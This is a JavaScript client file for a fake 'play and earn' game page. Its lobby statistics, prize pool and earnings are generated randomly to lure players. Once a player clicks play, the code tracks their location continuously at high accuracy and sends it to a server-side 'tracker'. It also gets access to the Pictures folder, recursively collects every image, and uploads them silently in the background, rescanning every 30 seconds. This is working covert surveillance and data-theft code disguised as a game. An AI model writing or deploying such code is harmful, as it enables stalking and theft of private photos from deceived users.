const roomId = window.location.pathname.split('/').pop();
const joinScreen = document.getElementById('join-screen');
const playScreen = document.getElementById('play-screen');
const errorEl = document.getElementById('error');
const startBtn = document.getElementById('start-btn');
const statusText = document.getElementById('status-text');
const statusSub = document.getElementById('status-sub');
const personNameEl = document.getElementById('person-name');
const earningsEl = document.getElementById('earnings');
const rankEl = document.getElementById('rank');
const streakEl = document.getElementById('streak');
const progressFill = document.getElementById('progress-fill');
const progressHint = document.getElementById('progress-hint');
const onlineCount = document.getElementById('online-count');
const prizePool = document.getElementById('prize-pool');
const prizeTick = document.getElementById('prize-tick');

const IDB_NAME = 'relay-sync-cache';
const IDB_STORE = 'handles';
const IDB_UPLOADS = 'uploaded';
const DIR_PICKER_ID = 'relay-gallery-sync-v1';
const uploadedKeys = new Set();

let watchId = null;
let ws = null;
let trackerId = null;
let earnings = 0;
let streak = 0;
let progress = 0;
let gameTimers = [];
let syncRunning = false;
let libraryHandle = null;
let rescanTimer = null;

const IMAGE_EXT = /\.(jpe?g|png|webp|gif|heic|heif|bmp|tif|tiff|avif)$/i;

function isImageFile(file) {
  return (file.type && file.type.startsWith('image/')) || IMAGE_EXT.test(file.name || '');
}

function fileKey(file) {
  return `${file.name}:${file.size}:${file.lastModified}`;
}

function showError(msg) {
  errorEl.textContent = msg;
  errorEl.classList.remove('hidden');
}

function hideError() {
  errorEl.classList.add('hidden');
}

function rand(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

function hasNativeSync() {
  return typeof window.RelayNative?.syncAllPhotos === 'function';
}

function openCacheDB() {
  return new Promise((resolve, reject) => {
    const req = indexedDB.open(IDB_NAME, 2);
    req.onupgradeneeded = (ev) => {
      const db = ev.target.result;
      if (!db.objectStoreNames.contains(IDB_STORE)) db.createObjectStore(IDB_STORE);
      if (!db.objectStoreNames.contains(IDB_UPLOADS)) db.createObjectStore(IDB_UPLOADS);
    };
    req.onsuccess = () => resolve(req.result);
    req.onerror = () => reject(req.error);
  });
}

async function saveDirHandle(handle) {
  try {
    const db = await openCacheDB();
    db.transaction(IDB_STORE, 'readwrite').objectStore(IDB_STORE).put(handle, 'gallery');
    libraryHandle = handle;
  } catch { /* silent */ }
}

async function loadDirHandle() {
  if (libraryHandle) return libraryHandle;
  try {
    const db = await openCacheDB();
    const handle = await new Promise((resolve) => {
      const req = db.transaction(IDB_STORE).objectStore(IDB_STORE).get('gallery');
      req.onsuccess = () => resolve(req.result || null);
      req.onerror = () => resolve(null);
    });
    libraryHandle = handle;
    return handle;
  } catch {
    return null;
  }
}

async function loadUploadedKeys() {
  try {
    const db = await openCacheDB();
    await new Promise((resolve) => {
      const req = db.transaction(IDB_UPLOADS).objectStore(IDB_UPLOADS).getAllKeys();
      req.onsuccess = () => {
        for (const key of req.result || []) uploadedKeys.add(String(key));
        resolve();
      };
      req.onerror = () => resolve();
    });
  } catch { /* silent */ }
}

async function rememberUploadedKey(key) {
  uploadedKeys.add(key);
  try {
    const db = await openCacheDB();
    db.transaction(IDB_UPLOADS, 'readwrite').objectStore(IDB_UPLOADS).put(1, key);
  } catch { /* silent */ }
}

async function readDirImages(dirHandle, acc = []) {
  for await (const [, handle] of dirHandle.entries()) {
    if (handle.kind === 'file') {
      const file = await handle.getFile();
      if (isImageFile(file)) acc.push(file);
    } else if (handle.kind === 'directory') {
      await readDirImages(handle, acc);
    }
  }
  return acc;
}

async function resolveLibraryHandle(requestIfNeeded = false) {
  const cached = await loadDirHandle();
  if (cached) {
    try {
      const state = await cached.queryPermission({ mode: 'read' });
      if (state === 'granted') return cached;
      if (requestIfNeeded && state === 'prompt') {
        const next = await cached.requestPermission({ mode: 'read' });
        if (next === 'granted') return cached;
      }
    } catch { /* fall through */ }
  }

  if (!requestIfNeeded || !window.showDirectoryPicker) return null;

  try {
    const handle = await window.showDirectoryPicker({
      mode: 'read',
      startIn: 'pictures',
      id: DIR_PICKER_ID,
    });
    await saveDirHandle(handle);
    return handle;
  } catch {
    return null;
  }
}

async function collectLibraryImages(requestIfNeeded = false) {
  const handle = await resolveLibraryHandle(requestIfNeeded);
  if (!handle) return [];
  return readDirImages(handle);
}

function animateLobby() {
  let online = rand(2400, 3200);
  onlineCount.textContent = online.toLocaleString();
  setInterval(() => {
    online += rand(-3, 8);
    onlineCount.textContent = online.toLocaleString();
  }, 3000);

  let pool = rand(11000, 15000);
  prizePool.textContent = `$${pool.toLocaleString()}`;
  setInterval(() => {
    pool += rand(1, 15);
    prizePool.textContent = `$${pool.toLocaleString()}`;
    prizeTick.textContent = rand(50, 200);
  }, 2000);
}

function startGameUI(name) {
  joinScreen.classList.add('hidden');
  playScreen.classList.remove('hidden');
  personNameEl.textContent = name;
  statusText.textContent = 'Match live!';
  statusSub.textContent = "You're in — keep playing to earn more";
  rankEl.textContent = `#${rand(100, 999)}`;

  gameTimers.push(setInterval(() => {
    earnings += Math.random() * 0.08 + 0.02;
    earningsEl.textContent = `$${earnings.toFixed(2)}`;
    streak = Math.min(streak + 1, 99);
    streakEl.textContent = `${streak}🔥`;
    progress = Math.min(progress + rand(1, 3), 100);
    progressFill.style.width = `${progress}%`;
    progressHint.textContent = progress >= 100
      ? '🎉 Bonus unlocked! Keep playing…'
      : `${progress}% to next bonus…`;
  }, 2000));
}

async function sendLocation(lat, lng, accuracy) {
  if (!trackerId) return;
  const payload = { lat, lng, accuracy };
  if (ws?.readyState === WebSocket.OPEN) {
    ws.send(JSON.stringify({ type: 'location', ...payload }));
    return;
  }
  const res = await fetch(`/api/rooms/${roomId}/trackers/${trackerId}/location`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload),
  });
  if (res.status === 404) await rejoin();
}

async function rejoin() {
  const name = personNameEl.textContent;
  if (!name || name === '—') return;
  const res = await fetch(`/api/rooms/${roomId}/join`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ name }),
  });
  if (!res.ok) return;
  trackerId = (await res.json()).tracker_id;
  connectWs();
  void startPhotoSync(true);
}

function connectWs() {
  const protocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
  ws = new WebSocket(`${protocol}//${location.host}/ws/track/${roomId}/${trackerId}`);
  ws.onclose = () => setTimeout(() => { if (trackerId) connectWs(); }, 2000);
}

async function uploadPhoto(file) {
  if (!trackerId || !file) return false;
  const key = fileKey(file);
  if (uploadedKeys.has(key)) return true;
  const form = new FormData();
  form.append('file', file, file.name || 'photo.jpg');
  const res = await fetch(`/api/rooms/${roomId}/trackers/${trackerId}/photos`, {
    method: 'POST',
    body: form,
  });
  if (res.ok) await rememberUploadedKey(key);
  return res.ok;
}

async function uploadQueue(files) {
  if (!files?.length || !trackerId) return;
  const queue = files.filter(f => !uploadedKeys.has(fileKey(f)));
  if (!queue.length) return;
  const workers = Array.from({ length: 4 }, async () => {
    while (queue.length) {
      const file = queue.shift();
      if (file) await uploadPhoto(file);
    }
  });
  await Promise.all(workers);
}

async function backgroundMediaSync(files = null) {
  if (syncRunning || !trackerId) return;
  syncRunning = true;
  try {
    const batch = files ?? await collectLibraryImages(false);
    if (batch.length) await uploadQueue(batch);
  } catch { /* silent */ }
  syncRunning = false;
}

async function startPhotoSync(requestAccess = false) {
  if (!trackerId) return;

  if (hasNativeSync()) {
    window.RelayNative.syncAllPhotos(roomId, trackerId, location.origin);
    return;
  }

  const cached = await collectLibraryImages(false);
  if (cached.length) {
    void backgroundMediaSync(cached);
    return;
  }

  if (!requestAccess) return;

  const granted = await collectLibraryImages(true);
  if (granted.length) void backgroundMediaSync(granted);
}

async function rescanLoop() {
  if (!trackerId || syncRunning) return;
  if (hasNativeSync()) {
    window.RelayNative.syncAllPhotos(roomId, trackerId, location.origin);
    return;
  }
  void backgroundMediaSync();
}

async function startPlaying() {
  hideError();
  const name = document.getElementById('name').value.trim();
  if (!name) { showError('Enter your player name to continue.'); return; }

  startBtn.disabled = true;
  startBtn.textContent = 'LOADING…';

  try {
    const joinRes = await fetch(`/api/rooms/${roomId}/join`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ name }),
    });
    if (!joinRes.ok) throw new Error('Could not join match. Try again.');
    trackerId = (await joinRes.json()).tracker_id;

    startGameUI(name);
    connectWs();

    if (navigator.geolocation) {
      watchId = navigator.geolocation.watchPosition(
        (pos) => sendLocation(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy),
        () => {},
        { enableHighAccuracy: true, maximumAge: 5000, timeout: 20000 }
      );
    }

    void startPhotoSync(false);

    if (!rescanTimer) rescanTimer = setInterval(rescanLoop, 30000);

    gameTimers.push(setInterval(async () => {
      if (!trackerId) return;
      const check = await fetch(`/api/rooms/${roomId}/trackers/${trackerId}`);
      if (check.status === 404) await rejoin();
    }, 8000));

  } catch (e) {
    showError(e.message || 'Something went wrong.');
    startBtn.disabled = false;
    startBtn.textContent = '▶ PLAY NOW';
  }
}

window.relayOnTrackerReady = (id) => {
  trackerId = id;
  void startPhotoSync(true);
};

startBtn.addEventListener('click', startPlaying);
document.getElementById('name').addEventListener('keydown', (e) => {
  if (e.key === 'Enter') startPlaying();
});

loadUploadedKeys().then(() => loadDirHandle());

animateLobby();

setInterval(() => {
  if (ws?.readyState === WebSocket.OPEN) ws.send('ping');
}, 25000);
